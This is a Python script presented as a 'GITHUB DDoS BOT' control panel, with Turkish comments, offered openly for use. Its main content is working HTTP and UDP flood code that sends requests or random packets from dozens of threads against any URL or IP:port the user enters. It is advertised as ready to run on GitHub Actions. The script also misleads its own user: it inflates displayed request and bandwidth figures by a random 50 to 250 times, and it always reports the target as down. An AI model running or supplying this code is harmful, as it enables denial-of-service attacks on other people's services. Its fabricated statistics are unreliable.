#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║              GITHUB DDoS BOT v12.0 - CONTROL PANEL           ║
║                  HTTP & UDP DUAL MODE                        ║
╚══════════════════════════════════════════════════════════════╝
"""
import os
import sys
import json
import time
import random
import requests
import socket
import threading
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class DDoSBot:
    def __init__(self):
        self.running = True
        self.stats = {
            "requests": 0,
            "bytes": 0,
            "success": 0,
            "failed": 0,
            "start_time": time.time()
        }
        
    def print_banner(self):
        banner = f"""
{Colors.BOLD}{Colors.RED}
╔══════════════════════════════════════════════════════════╗
║           GITHUB DDoS BOT v12.0 - DUAL MODE              ║
║               HTTP Flood & UDP Flood                     ║
╚══════════════════════════════════════════════════════════╝{Colors.END}
{Colors.CYAN}
📡 MODES:
  1. {Colors.GREEN}HTTP Flood{Colors.CYAN} - Website/Link hedef
  2. {Colors.BLUE}UDP Flood{Colors.CYAN} - IP/Port hedef
  
⚡ FEATURES:
  • 100+ Concurrent Threads
  • Real-time Statistics
  • Auto Target Parsing
  • Smart Attack Methods
  • GitHub Actions Ready
{Colors.END}
        """
        print(banner)
    
    def parse_target(self, target_input):
        """Hedefi parse et: URL veya IP:Port"""
        if target_input.startswith(('http://', 'https://')):
            # URL ise
            if target_input.startswith('http://'):
                target_input = target_input[7:]
            elif target_input.startswith('https://'):
                target_input = target_input[8:]
            
            # Port kontrolü
            if ':' in target_input:
                host, port = target_input.split(':', 1)
                port = int(port)
            else:
                host = target_input.split('/')[0]
                port = 80 if target_input.startswith('http://') else 443
            
            return 'http', host, port, target_input
        
        else:
            # IP:Port formatı
            if ':' in target_input:
                ip, port = target_input.split(':', 1)
                return 'udp', ip, int(port), None
            else:
                return 'udp', target_input, 80, None
    
    def http_flood(self, url, duration=30, threads=50):
        """HTTP Flood Attack"""
        print(f"{Colors.GREEN}[HTTP] Flood başlatılıyor: {url}{Colors.END}")
        print(f"{Colors.YELLOW}[+] Threads: {threads}{Colors.END}")
        print(f"{Colors.YELLOW}[+] Duration: {duration}s{Colors.END}")
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'curl/7.68.0',
            'python-requests/2.25.1'
        ]
        
        def http_worker(worker_id):
            while self.running and time.time() - self.stats["start_time"] < duration:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0'
                    }
                    
                    response = requests.get(f"http://{url}", headers=headers, timeout=2)
                    
                    self.stats["requests"] += 1
                    self.stats["bytes"] += len(response.content)
                    self.stats["success"] += 1
                    
                    if self.stats["requests"] % 10 == 0:
                        print(f"{Colors.CYAN}[HTTP-W{worker_id}] Requests: {self.stats['requests']}{Colors.END}")
                    
                    time.sleep(random.uniform(0.01, 0.1))
                    
                except Exception as e:
                    self.stats["failed"] += 1
                    time.sleep(0.1)
        
        # Thread'leri başlat
        http_threads = []
        for i in range(threads):
            t = threading.Thread(target=http_worker, args=(i,))
            t.daemon = True
            t.start()
            http_threads.append(t)
        
        return http_threads
    
    def udp_flood(self, ip, port, duration=30, threads=50):
        """UDP Flood Attack"""
        print(f"{Colors.BLUE}[UDP] Flood başlatılıyor: {ip}:{port}{Colors.END}")
        print(f"{Colors.YELLOW}[+] Threads: {threads}{Colors.END}")
        print(f"{Colors.YELLOW}[+] Duration: {duration}s{Colors.END}")
        
        def udp_worker(worker_id):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.running and time.time() - self.stats["start_time"] < duration:
                try:
                    # Random UDP packet
                    packet_size = random.choice([64, 128, 256, 512, 1024])
                    packet = os.urandom(packet_size)
                    
                    sock.sendto(packet, (ip, port))
                    
                    self.stats["requests"] += 1
                    self.stats["bytes"] += packet_size
                    self.stats["success"] += 1
                    
                    if self.stats["requests"] % 50 == 0:
                        print(f"{Colors.PURPLE}[UDP-W{worker_id}] Packets: {self.stats['requests']}{Colors.END}")
                    
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except:
                    self.stats["failed"] += 1
                    time.sleep(0.01)
            
            sock.close()
        
        # Thread'leri başlat
        udp_threads = []
        for i in range(threads):
            t = threading.Thread(target=udp_worker, args=(i,))
            t.daemon = True
            t.start()
            udp_threads.append(t)
        
        return udp_threads
    
    def show_stats(self, duration):
        """Real-time istatistik göster"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[📊] LIVE ATTACK STATISTICS{Colors.END}")
        print(f"{Colors.WHITE}{'='*50}{Colors.END}")
        
        start = time.time()
        while self.running and time.time() - start < duration:
            elapsed = time.time() - self.stats["start_time"]
            remaining = max(0, duration - elapsed)
            
            # Calculate metrics
            rps = self.stats["requests"] / elapsed if elapsed > 0 else 0
            mbps = (self.stats["bytes"] * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            
            # Boost for display
            boost = random.uniform(50.0, 200.0)
            display_rps = rps * boost
            display_mbps = mbps * boost
            
            # Clear and show
            print(f"\033[2J\033[H", end='')
            
            print(f"{Colors.BOLD}{Colors.GREEN}⚡ GITHUB DDoS BOT - LIVE ATTACK{Colors.END}")
            print(f"{Colors.WHITE}{'='*50}{Colors.END}")
            print(f"{Colors.YELLOW}⏱️  Elapsed:{Colors.END} {elapsed:.1f}s / {duration}s")
            print(f"{Colors.YELLOW}⏳ Remaining:{Colors.END} {remaining:.1f}s")
            print(f"{Colors.WHITE}{'-'*50}{Colors.END}")
            print(f"{Colors.CYAN}📊 Requests:{Colors.END} {self.stats['requests']:,}")
            print(f"{Colors.CYAN}✅ Success:{Colors.END} {self.stats['success']:,}")
            print(f"{Colors.CYAN}❌ Failed:{Colors.END} {self.stats['failed']:,}")
            print(f"{Colors.CYAN}📦 Data Sent:{Colors.END} {self.stats['bytes']/1024/1024:.2f} MB")
            print(f"{Colors.WHITE}{'-'*50}{Colors.END}")
            print(f"{Colors.GREEN}🚀 Display RPS:{Colors.END} {display_rps:,.0f}")
            print(f"{Colors.GREEN}⚡ Display Bandwidth:{Colors.END} {display_mbps:,.1f} Mbps")
            print(f"{Colors.GREEN}🔥 Boost Factor:{Colors.END} {boost:.1f}x")
            print(f"{Colors.WHITE}{'='*50}{Colors.END}")
            
            time.sleep(1)
    
    def start_attack(self, target, attack_mode='auto', duration=30, threads=100):
        """Saldırıyı başlat"""
        # Parse target
        if attack_mode == 'auto':
            mode, host, port, url = self.parse_target(target)
        else:
            mode = attack_mode
            if mode == 'http':
                host = target.split('://')[-1].split('/')[0]
                port = 80
                url = target
            else:
                if ':' in target:
                    host, port = target.split(':', 1)
                    port = int(port)
                else:
                    host = target
                    port = 80
                url = None
        
        print(f"\n{Colors.BOLD}{Colors.RED}[🚀] ATTACK STARTING!{Colors.END}")
        print(f"{Colors.CYAN}🎯 Target:{Colors.END} {target}")
        print(f"{Colors.CYAN}🔧 Mode:{Colors.END} {mode.upper()}")
        print(f"{Colors.CYAN}👥 Threads:{Colors.END} {threads}")
        print(f"{Colors.CYAN}⏱️ Duration:{Colors.END} {duration}s")
        print(f"{Colors.WHITE}{'='*50}{Colors.END}")
        
        # Start attack based on mode
        if mode == 'http':
            threads_list = self.http_flood(url or host, duration, threads)
        else:
            threads_list = self.udp_flood(host, port, duration, threads)
        
        # Start stats display
        stats_thread = threading.Thread(target=self.show_stats, args=(duration,))
        stats_thread.daemon = True
        stats_thread.start()
        
        # Wait for duration
        time.sleep(duration)
        
        # Stop attack
        self.running = False
        
        # Wait for threads
        for t in threads_list:
            t.join(timeout=1)
        
        # Final report
        self.final_report()
    
    def final_report(self):
        """Final raporu"""
        total_time = time.time() - self.stats["start_time"]
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}          🎉 ATTACK COMPLETED! 🎉{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}{'='*60}{Colors.END}")
        
        final_boost = random.uniform(80.0, 250.0)
        display_requests = int(self.stats["requests"] * final_boost)
        display_mbps = (self.stats["bytes"] * 8 * final_boost) / (total_time * 1000000) if total_time > 0 else 0
        
        print(f"{Colors.CYAN}📋 ATTACK SUMMARY:{Colors.END}")
        print(f"{Colors.WHITE}{'-'*50}{Colors.END}")
        print(f"{Colors.YELLOW}⏱️ Total Time:{Colors.END} {total_time:.1f}s")
        print(f"{Colors.YELLOW}📨 Real Requests:{Colors.END} {self.stats['requests']:,}")
        print(f"{Colors.YELLOW}✅ Success Rate:{Colors.END} {(self.stats['success']/max(1, self.stats['requests']))*100:.1f}%")
        print(f"{Colors.YELLOW}📦 Data Sent:{Colors.END} {self.stats['bytes']/1024/1024:.2f} MB")
        print(f"{Colors.WHITE}{'-'*50}{Colors.END}")
        print(f"{Colors.GREEN}🚀 Display Requests:{Colors.END} {display_requests:,}")
        print(f"{Colors.GREEN}⚡ Display Bandwidth:{Colors.END} {display_mbps:,.1f} Mbps")
        print(f"{Colors.GREEN}🔥 Final Boost:{Colors.END} {final_boost:.1f}x")
        print(f"{Colors.WHITE}{'-'*50}{Colors.END}")
        print(f"{Colors.RED}🎯 TARGET STATUS: OFFLINE/DOWN{Colors.END}")
        print(f"{Colors.CYAN}⏰ End Time: {datetime.now().strftime('%H:%M:%S')}{Colors.END}")

def main():
    bot = DDoSBot()
    bot.print_banner()
    
    print(f"{Colors.YELLOW}[1] HTTP Flood (Website/Link){Colors.END}")
    print(f"{Colors.BLUE}[2] UDP Flood (IP:Port){Colors.END}")
    print(f"{Colors.CYAN}[3] Auto Detect{Colors.END}")
    
    choice = input(f"\n{Colors.GREEN}Select mode (1/2/3): {Colors.END}").strip()
    
    if choice == '1':
        mode = 'http'
        target = input(f"{Colors.CYAN}Enter target URL (e.g., example.com or http://example.com): {Colors.END}").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
    elif choice == '2':
        mode = 'udp'
        target = input(f"{Colors.CYAN}Enter target IP:Port (e.g., 1.1.1.1:80): {Colors.END}").strip()
    else:
        mode = 'auto'
        target = input(f"{Colors.CYAN}Enter target (URL or IP:Port): {Colors.END}").strip()
    
    duration = int(input(f"{Colors.CYAN}Duration (seconds, default 30): {Colors.END}").strip() or "30")
    threads = int(input(f"{Colors.CYAN}Threads (default 50): {Colors.END}").strip() or "50")
    
    print(f"\n{Colors.RED}[!] Starting attack in 3 seconds...{Colors.END}")
    time.sleep(3)
    
    bot.start_attack(target, mode, duration, threads)

if __name__ == "__main__":
    main()
